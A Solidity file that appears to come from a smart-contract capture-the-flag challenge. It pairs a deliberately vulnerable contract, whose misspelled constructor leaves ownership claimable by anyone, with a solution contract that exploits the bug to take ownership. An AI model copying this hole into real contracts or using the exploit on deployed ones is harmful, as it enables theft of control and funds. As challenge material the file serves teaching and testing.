pragma solidity ^0.4.21;

contract AssumeOwnershipChallenge {
    address owner;
    bool public isComplete;

    function AssumeOwmershipChallenge() public {
        owner = msg.sender;
    }

    function authenticate() public {
        require(msg.sender == owner);

        isComplete = true;
    }
}

contract AssumeOwnershipSolution {
    constructor(address _challengeAddress) public {
        AssumeOwnershipChallenge challenge = AssumeOwnershipChallenge(_challengeAddress);
        challenge.AssumeOwmershipChallenge();
        challenge.authenticate();

        require(challenge.isComplete());
    }
}